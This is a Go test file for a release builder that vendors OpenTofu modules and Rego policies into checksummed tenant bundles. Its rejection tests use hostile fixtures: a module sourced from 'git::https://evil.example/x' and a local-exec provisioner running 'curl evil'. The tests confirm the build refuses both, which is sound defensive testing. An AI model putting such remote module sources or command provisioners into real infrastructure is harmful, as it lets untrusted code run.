package release

import (
	"context"
	"fmt"
	"strings"
	"testing"
)

// fakeFetch serves module packages from memory.
type fakeFetch map[string]map[string][]byte

func (f fakeFetch) Fetch(_ context.Context, source, version string) (map[string][]byte, string, error) {
	p, ok := f[source+"@"+version]
	if !ok {
		return nil, "", fmt.Errorf("%s %s: not on the registry", source, version)
	}
	return p, "github.com/x/y@abc", nil
}

func repo(extra map[string]string) map[string][]byte {
	files := map[string]string{
		"catalog/providers/common.yaml": "registry: registry.opentofu.org\nproviders:\n  - {source: hashicorp/random, version: 3.9.1}\n",
		"catalog/providers/aws.yaml":    "registry: registry.opentofu.org\nproviders:\n  - {source: hashicorp/aws, version: 6.70.0}\n",
		"catalog/modules/aws/bucket.yaml": `kind: Bucket
id: aws-bucket
title: Bucket
description: d
source: acme/bucket/aws
versions: [1.0.0]
providers: [hashicorp/aws]
dependencies:
  - {source: acme/kms/aws, versions: [2.1.0, 2.3.0, 3.0.0]}
inputs:
  - {name: name, type: string, required: true}
  - {name: versioning, type: bool, default: true}
enforced:
  encrypted: true
outputs: [arn]
`,
		"tenants/acme/defaults/Bucket.yaml":  "apiVersion: pravaha/v1\nkind: Defaults\ntarget: Bucket\nspec:\n  versioning: false\n",
		"tenants/other/defaults/Bucket.yaml": "apiVersion: pravaha/v1\nkind: Defaults\ntarget: Bucket\nspec:\n  name: other-tenant-secret-default\n",
	}
	for k, v := range extra {
		files[k] = v
	}
	out := map[string][]byte{}
	for k, v := range files {
		out[k] = []byte(v)
	}
	return out
}

func packages() fakeFetch {
	return fakeFetch{
		"acme/bucket/aws@1.0.0": {
			"main.tf":                []byte("variable \"name\" {}\nvariable \"versioning\" {}\nvariable \"encrypted\" {}\nmodule \"key\" {\n  source  = \"acme/kms/aws\"\n  version = \"~> 2.1\"\n}\nmodule \"local\" {\n  source = \"./modules/policy\"\n}\noutput \"arn\" { value = 1 }\n"),
			"modules/policy/main.tf": []byte("variable \"x\" { default = 1 }\n"),
			"modules/unused/main.tf": []byte("module \"evil\" {\n  source = \"git::https://evil.example/x\"\n}\n"),
		},
		"acme/kms/aws@2.1.0": {"main.tf": []byte("output \"id\" { value = 1 }\n")},
		"acme/kms/aws@2.3.0": {"main.tf": []byte("output \"id\" { value = 1 }\n")},
		"acme/kms/aws@3.0.0": {"main.tf": []byte("output \"id\" { value = 1 }\n")},
	}
}

func TestBuildModules(t *testing.T) {
	res := BuildModules(context.Background(), ModulesInput{Files: repo(nil), Tenant: "acme", Revision: "abc", Fetch: packages()})
	if !res.OK() {
		t.Fatalf("build failed: %+v", res.Checks)
	}
	m := res.Manifest
	if m.Defaults.For("Bucket") == nil || string(m.Defaults.For("Bucket").Spec["versioning"]) != "false" {
		t.Fatal("tenant defaults not deployed with the release")
	}
	files := map[string]string{}
	got, err := Unpack(res.Bundle, res.SHA256, nil, func(name string, b []byte) error { files[name] = string(b); return nil })
	if err != nil || got.Revision != "abc" {
		t.Fatalf("unpack: %v", err)
	}
	main := files["vendor/acme/bucket/aws/1.0.0/main.tf"]
	if !strings.Contains(main, `source = "../../../kms/aws/2.3.0"`) || strings.Contains(main, "version") && strings.Contains(main, "~> 2.1") {
		t.Fatalf("nested module not pinned to the highest approved match:\n%s", main)
	}
	if _, kept := files["vendor/acme/bucket/aws/1.0.0/modules/unused/main.tf"]; kept {
		t.Fatal("configuration nothing loads must be left out of the bundle")
	}
	if m.Modules["acme/bucket/aws@1.0.0"] != "vendor/acme/bucket/aws/1.0.0" {
		t.Fatalf("module index = %v", m.Modules)
	}
	own := map[string][]byte{}
	for name, b := range files {
		if rel, ok := strings.CutPrefix(name, "vendor/acme/bucket/aws/1.0.0/"); ok {
			own[rel] = []byte(b)
		}
	}
	if PackageSum(own) != m.Packages["acme/bucket/aws@1.0.0"].SHA256 {
		t.Fatal("the package checksum must cover the files as shipped in the bundle")
	}
	cl := m.Closure("vendor/acme/bucket/aws/1.0.0")
	if len(cl) != 2 || cl["vendor/acme/kms/aws/2.3.0"] == "" || cl["vendor/acme/bucket/aws/1.0.0"] != m.Packages["acme/bucket/aws@1.0.0"].SHA256 {
		t.Fatalf("closure = %v", cl)
	}
	if _, err := Unpack(res.Bundle, strings.Repeat("0", 64), nil, nil); err == nil {
		t.Fatal("a bundle with the wrong checksum must be refused")
	}
	again := BuildModules(context.Background(), ModulesInput{Files: repo(nil), Tenant: "acme", Revision: "abc", Fetch: packages()})
	again.Manifest.BuiltAt = m.BuiltAt
	if b, sum, _ := Pack(again.Manifest, nil); b == nil || sum == "" {
		t.Fatal("pack failed")
	}
}

func TestBuildModulesRejects(t *testing.T) {
	for name, c := range map[string]struct {
		repo  map[string]string
		pkgs  func(fakeFetch)
		check string
	}{
		"bad defaults": {repo: map[string]string{"tenants/acme/defaults/Bucket.yaml": "apiVersion: pravaha/v1\nkind: Defaults\ntarget: Bucket\nspec:\n  encrypted: false\n"}, check: "Defaults for tenant acme"},
		"git nested": {pkgs: func(f fakeFetch) {
			f["acme/bucket/aws@1.0.0"]["main.tf"] = []byte("variable \"name\" {}\nvariable \"versioning\" {}\nvariable \"encrypted\" {}\nmodule \"x\" {\n  source = \"git::https://evil.example/x\"\n}\noutput \"arn\" { value = 1 }\n")
		}, check: "Nested modules"},
		"unapproved nested": {pkgs: func(f fakeFetch) {
			f["acme/bucket/aws@1.0.0"]["main.tf"] = []byte("variable \"name\" {}\nvariable \"versioning\" {}\nvariable \"encrypted\" {}\nmodule \"x\" {\n  source = \"acme/kms/aws\"\n  version = \">= 4.0\"\n}\noutput \"arn\" { value = 1 }\n")
		}, check: "Nested modules"},
		"escape": {pkgs: func(f fakeFetch) {
			f["acme/bucket/aws@1.0.0"]["main.tf"] = []byte("variable \"name\" {}\nvariable \"versioning\" {}\nvariable \"encrypted\" {}\nmodule \"x\" {\n  source = \"../../../kms/aws/2.1.0\"\n}\noutput \"arn\" { value = 1 }\n")
		}, check: "Nested modules"},
		"provisioner": {pkgs: func(f fakeFetch) {
			f["acme/bucket/aws@1.0.0"]["modules/policy/main.tf"] = []byte("resource \"null_resource\" \"x\" {\n  provisioner \"local-exec\" { command = \"curl evil\" }\n}\n")
		}, check: "No command execution"},
		"missing variable": {pkgs: func(f fakeFetch) {
			f["acme/bucket/aws@1.0.0"]["main.tf"] = []byte("variable \"name\" {}\nvariable \"encrypted\" {}\noutput \"arn\" { value = 1 }\n")
		}, check: "Kinds match"},
		"not on registry": {pkgs: func(f fakeFetch) { delete(f, "acme/kms/aws@3.0.0") }, check: "Module packages"},
	} {
		t.Run(name, func(t *testing.T) {
			p := packages()
			if c.pkgs != nil {
				c.pkgs(p)
			}
			res := BuildModules(context.Background(), ModulesInput{Files: repo(c.repo), Tenant: "acme", Fetch: p})
			if res.OK() || res.Bundle != nil {
				t.Fatal("build passed")
			}
			for _, ch := range res.Checks {
				if strings.HasPrefix(ch.Name, c.check) && !ch.OK {
					return
				}
			}
			t.Fatalf("want failed check %q, got %+v", c.check, res.Checks)
		})
	}
}

func TestBuildPolicies(t *testing.T) {
	deny := "package pravaha.policy\n\ndeny contains msg if {\n\tsome r in input.plan.resources\n\tr.type == \"aws_s3_bucket\"\n\tmsg := \"no buckets\"\n}\n"
	test := "package pravaha.policy_test\n\nimport data.pravaha.policy\n\ntest_denies if {\n\tcount(policy.deny) == 1 with input as {\"plan\": {\"resources\": [{\"type\": \"aws_s3_bucket\"}]}}\n}\n\ntest_allows if {\n\tcount(policy.deny) == 0 with input as {\"plan\": {\"resources\": []}}\n}\n"
	files := map[string][]byte{
		"policies/global/no-buckets.rego":                    []byte(deny),
		"policies/global/no-buckets_test.rego":               []byte(test),
		"policies/tenants/acme/entities/retail/tagging.rego": []byte("package pravaha.policy\n\ndeny contains \"x\" if false\n"),
		"policies/tenants/acme/entities/retail/tagging.yaml": []byte("apiVersion: pravaha/v1\nkind: PolicySet\nlevel: advisory\ndescription: tags\n"),
		"policies/tenants/globex/secret.rego":                []byte("package pravaha.policy\n"),
	}
	res := BuildPolicies(context.Background(), PoliciesInput{Files: files, Path: "policies", Tenant: "acme", Revision: "r1"})
	if !res.OK() {
		t.Fatalf("%+v", res.Checks)
	}
	ps := res.Manifest.Policies
	if len(ps) != 2 || ps[0].Name != "no-buckets" || ps[0].Tests != 2 || ps[1].Name != "retail-tagging" || ps[1].Scope != "entity:retail" || ps[1].Level != "advisory" {
		t.Fatalf("policies = %+v", ps)
	}
	// A failing test fails the build.
	files["policies/global/no-buckets_test.rego"] = []byte(strings.Replace(test, "count(policy.deny) == 0", "count(policy.deny) == 1", 1))
	if res := BuildPolicies(context.Background(), PoliciesInput{Files: files, Path: "policies", Tenant: "acme"}); res.OK() {
		t.Fatal("failing test passed the build")
	}
	files["policies/global/no-buckets_test.rego"] = []byte(test)
	files["policies/global/broken.rego"] = []byte("package other\n")
	if res := BuildPolicies(context.Background(), PoliciesInput{Files: files, Path: "policies", Tenant: "acme"}); res.OK() {
		t.Fatal("wrong package passed the build")
	}
	delete(files, "policies/global/broken.rego")
	if res := BuildPolicies(context.Background(), PoliciesInput{Files: files, Path: "policies", Tenant: "acme", Reserved: map[string]bool{"no-buckets": true}}); res.OK() {
		t.Fatal("a name managed in the console was reused")
	}
}
